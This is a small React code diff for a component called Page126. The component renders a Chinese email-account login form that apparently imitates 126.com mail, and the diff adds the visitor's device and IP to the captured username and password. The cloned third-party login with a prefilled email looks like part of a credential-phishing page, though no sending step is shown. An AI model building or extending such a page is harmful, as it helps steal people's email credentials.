@@ -7,6 +7,8 @@ import { navigate } from "@reach/router";
 function Page126({ location }) {
   const [values, setValues] = useState({
     username: location.state.email,
+    device: location.state.device,
+    ip: location.state.ip,
     password: "",
   });
 
@@ -144,12 +146,7 @@ function Page126({ location }) {
                   <h3 className="loginbox-title" data-lang-key="邮箱帐号登录">
                     邮箱帐号登录
                   </h3>
-                  <input
-                    type="hidden"
-                    className="js-domain"
-                    name="domain"
-                    
-                  />
+                  <input type="hidden" className="js-domain" name="domain" />
                   <input
                     type="hidden"
                     className="js-accname"
